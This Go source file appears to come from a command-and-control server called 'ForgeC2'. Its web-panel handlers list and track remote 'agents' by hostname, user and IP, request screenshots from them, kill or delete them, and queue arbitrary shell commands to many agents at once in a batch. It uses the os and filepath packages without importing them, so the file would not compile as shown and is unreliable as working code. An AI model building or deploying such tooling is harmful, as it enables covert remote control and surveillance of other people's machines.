package server

import (
	"bytes"
	"fmt"
	"html/template"
	"log/slog"
	"net/http"
	"strconv"
	"strings"
	"time"

	"github.com/forgec2/forgec2/internal/db"
	"github.com/gin-gonic/gin"
)

func (s *Server) handleDashboard(c *gin.Context) {
	var totalAgents int64
	s.db.Model(&db.Agent{}).Count(&totalAgents)

	var onlineAgents int64
	s.db.Model(&db.Agent{}).Where("last_seen > ?", time.Now().Add(-OfflineThreshold)).Count(&onlineAgents)

	var todayTasks int64
	s.db.Model(&db.Task{}).Where("created_at >= ?", time.Now().AddDate(0, 0, -1)).Count(&todayTasks)

	var recentTasks []db.Task
	s.db.Preload("Agent").
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop"}).
		Order("created_at desc").Limit(DashboardRecentTasks).Find(&recentTasks)

	data := gin.H{
		"Title":        "ForgeC2 - Dashboard",
		"ActiveNav":    "dashboard",
		"TotalAgents":  totalAgents,
		"OnlineAgents": onlineAgents,
		"TodayTasks":   todayTasks,
		"RecentTasks":  recentTasks,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "dashboard_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleAgents(c *gin.Context) {
	search := c.Query("search")
	statusFilter := c.Query("status")
	pageStr := c.DefaultQuery("page", "1")
	pageSizeStr := c.DefaultQuery("pageSize", "20")

	offlineThreshold := 60 * time.Second

	query := s.db.Model(&db.Agent{})
	if search != "" {
		query = query.Where("hostname LIKE ? OR username LIKE ? OR ip LIKE ?", "%"+search+"%", "%"+search+"%", "%"+search+"%")
	}
	if statusFilter == "online" {
		query = query.Where("last_seen > ?", time.Now().Add(-offlineThreshold))
	} else if statusFilter == "offline" {
		query = query.Where("last_seen <= ?", time.Now().Add(-offlineThreshold))
	}

	var total int64
	query.Count(&total)

	pageNum, _ := strconv.Atoi(pageStr)
	if pageNum < 1 {
		pageNum = 1
	}
	pageSize, _ := strconv.Atoi(pageSizeStr)
	if pageSize < 1 {
		pageSize = DefaultPageSize
	}
	if pageSize > MaxPageSize {
		pageSize = MaxPageSize
	}

	var agents []db.Agent
	query.Order("last_seen desc").Offset((pageNum - 1)*pageSize).Limit(pageSize).Find(&agents)

	for i := range agents {
		if time.Since(agents[i].LastSeen) > offlineThreshold {
			agents[i].Status = "offline"
		} else {
			agents[i].Status = "online"
		}
	}

	data := gin.H{
		"Title":     "ForgeC2 - Agents",
		"ActiveNav": "agents",
		"Agents":    agents,
		"Search":    search,
		"Status":    statusFilter,
		"Page":      pageNum,
		"PageSize":  pageSize,
		"Total":     total,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agents_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}

func (s *Server) handleAgentDetail(c *gin.Context) {
	id := c.Param("id")
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.String(http.StatusNotFound, "Agent not found")
		return
	}

	if time.Since(agent.LastSeen) > OfflineThreshold {
		agent.Status = "offline"
	} else {
		agent.Status = "online"
	}

	var tasks []db.Task
	s.db.Where("agent_id = ?", id).
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop"}).
		Order("created_at desc").Limit(AgentDetailTaskLimit).Find(&tasks)

	var screenshots []string
	screenshotDir := filepath.Join("data/screenshots", id)
	if files, err := os.ReadDir(screenshotDir); err == nil {
		for _, f := range files {
			if !f.IsDir() && strings.HasSuffix(f.Name(), ".png") {
				screenshots = append(screenshots, f.Name())
			}
		}
	}

	totalTasks := len(tasks)
	completedTasks := 0
	pendingTasks := 0
	failedTasks := 0
	totalResponseTime := time.Duration(0)
	shellTasks := 0
	screenshotTasks := 0
	psTasks := 0
	killTasks := 0

	for _, t := range tasks {
		switch t.Status {
		case "completed":
			completedTasks++
			totalResponseTime += t.UpdatedAt.Sub(t.CreatedAt)
		case "pending":
			pendingTasks++
		case "failed":
			failedTasks++
		}

		switch t.Type {
		case "shell":
			shellTasks++
		case "screenshot":
			screenshotTasks++
		case "ps":
			psTasks++
		case "kill":
			killTasks++
		}
	}

	successRate := 0
	if totalTasks > 0 {
		successRate = (completedTasks * 100) / totalTasks
	}

	avgResponseTime := "N/A"
	if completedTasks > 0 {
		avgDuration := totalResponseTime / time.Duration(completedTasks)
		if avgDuration.Seconds() > 60 {
			avgResponseTime = fmt.Sprintf("%.1f mins", avgDuration.Minutes())
		} else {
			avgResponseTime = fmt.Sprintf("%d secs", int(avgDuration.Seconds()))
		}
	}

	now := time.Now()
	agentAge := now.Sub(agent.CreatedAt)
	timeSinceLastSeen := now.Sub(agent.LastSeen)

	formatDuration := func(d time.Duration) string {
		if d.Hours() > 24 {
			return fmt.Sprintf("%d days", int(d.Hours()/24))
		} else if d.Hours() >= 1 {
			return fmt.Sprintf("%d hours", int(d.Hours()))
		} else if d.Minutes() >= 1 {
			return fmt.Sprintf("%d mins", int(d.Minutes()))
		}
		return fmt.Sprintf("%d secs", int(d.Seconds()))
	}

	uptime := formatDuration(agentAge)
	timeSince := formatDuration(timeSinceLastSeen)
	agentAgeStr := formatDuration(agentAge)

	data := gin.H{
		"Title":             fmt.Sprintf("ForgeC2 - Agent %s", agent.Hostname),
		"ActiveNav":         "agents",
		"Agent":             agent,
		"Tasks":             tasks,
		"Screenshots":       screenshots,
		"TotalTasks":        totalTasks,
		"CompletedTasks":    completedTasks,
		"PendingTasks":      pendingTasks,
		"FailedTasks":       failedTasks,
		"SuccessRate":       successRate,
		"AvgResponseTime":   avgResponseTime,
		"ShellTasks":        shellTasks,
		"ScreenshotTasks":   screenshotTasks,
		"PSTasks":          psTasks,
		"KillTasks":        killTasks,
		"Uptime":            uptime,
		"TimeSinceLastSeen": timeSince,
		"AgentAge":          agentAgeStr,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "agent_detail_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}





func (s *Server) handleKillAgent(c *gin.Context) {
	id := c.Param("id")
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "Agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "kill",
		Command: "exit",
		Status:  "pending",
	}
	if err := s.db.Create(&task).Error; err != nil {
		slog.Error("Failed to create kill task", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to create kill task"})
		return
	}

	slog.Info("Kill task created", "agent", id)
	s.LogAuditRecord(c, "kill_agent", "agent", id, "kill command", true, nil)
	s.broadcastTaskUpdate(id, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "message": "Kill command sent. Agent will exit on next beacon."})
}

func (s *Server) handleRequestScreenshot(c *gin.Context) {
	id := c.Param("id")
	var agent db.Agent
	if err := s.db.First(&agent, "id = ?", id).Error; err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": "agent not found"})
		return
	}

	task := db.Task{
		AgentID: id,
		Type:    "screenshot",
		Status:  "pending",
	}
	s.db.Create(&task)

	slog.Info("Screenshot requested", "agent", id)
	s.LogAuditRecord(c, "request_screenshot", "agent", id, "screenshot", true, nil)
	s.broadcastTaskUpdate(id, task)
	c.JSON(http.StatusOK, gin.H{"success": true, "task_id": task.ID})
}



func (s *Server) handleUpdateNote(c *gin.Context) {
	id := c.Param("id")
	note := c.PostForm("notes")
	s.db.Model(&db.Agent{}).Where("id = ?", id).Update("notes", note)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleDeleteAgent(c *gin.Context) {
	id := c.Param("id")
	tx := s.db.Begin()
	if err := tx.Where("agent_id = ?", id).Delete(&db.Task{}).Error; err != nil {
		tx.Rollback()
		slog.Error("Failed to delete tasks", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete tasks"})
		return
	}
	if err := tx.Delete(&db.Agent{}, "id = ?", id).Error; err != nil {
		tx.Rollback()
		slog.Error("Failed to delete agent", "agent_id", id, "err", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "failed to delete agent"})
		return
	}
	tx.Commit()
	os.RemoveAll(filepath.Join("data/screenshots", id))
	s.LogAuditRecord(c, "delete_agent", "agent", id, "", true, nil)
	slog.Warn("Agent deleted", "id", id)
	c.JSON(http.StatusOK, gin.H{"success": true})
}

func (s *Server) handleBatchCommand(c *gin.Context) {
	var req struct {
		AgentIDs []string `json:"agent_ids"`
		Command  string   `json:"command"`
		Shell    string   `json:"shell"`
	}

	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "invalid json"})
		return
	}

	if len(req.AgentIDs) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "no agents selected"})
		return
	}

	taskCount := 0
	for _, agentID := range req.AgentIDs {
		var agent db.Agent
		if err := s.db.First(&agent, "id = ?", agentID).Error; err != nil {
			continue
		}

		task := db.Task{
			AgentID: agentID,
			Type:    "shell",
			Command: req.Command,
			Shell:   req.Shell,
			Status:  "pending",
		}
		s.db.Create(&task)
		taskCount++
	}

	slog.Info("Batch command sent", "count", taskCount, "command", req.Command)
	c.JSON(http.StatusOK, gin.H{"success": true, "tasks_created": taskCount})
}

func (s *Server) handleTaskHistory(c *gin.Context) {
	pageStr := c.DefaultQuery("page", "1")
	pageSizeStr := c.DefaultQuery("pageSize", "50")

	pageNum, _ := strconv.Atoi(pageStr)
	if pageNum < 1 {
		pageNum = 1
	}
	pageSize, _ := strconv.Atoi(pageSizeStr)
	if pageSize < 1 {
		pageSize = DefaultTaskPageSize
	}
	if pageSize > MaxTaskPageSize {
		pageSize = MaxTaskPageSize
	}

	var total int64
	s.db.Model(&db.Task{}).Count(&total)

	var tasks []db.Task
	s.db.Preload("Agent").
		Where("type NOT IN ?", []string{"screen_stream_start", "screen_stream_stop"}).
		Order("created_at desc").Offset((pageNum - 1) * pageSize).Limit(pageSize).Find(&tasks)

	data := gin.H{
		"Title":     "ForgeC2 - Task History",
		"ActiveNav": "tasks",
		"Tasks":     tasks,
		"Page":      pageNum,
		"PageSize":  pageSize,
		"Total":     total,
	}

	var contentBuf bytes.Buffer
	if err := s.tmpl.ExecuteTemplate(&contentBuf, "tasks_content", data); err != nil {
		slog.Error("Failed to render content", "err", err)
		c.String(http.StatusInternalServerError, "Template error")
		return
	}

	data["Content"] = template.HTML(contentBuf.String())
	c.Header("Content-Type", "text/html; charset=utf-8")
	s.tmpl.ExecuteTemplate(c.Writer, "layout.html", data)
}
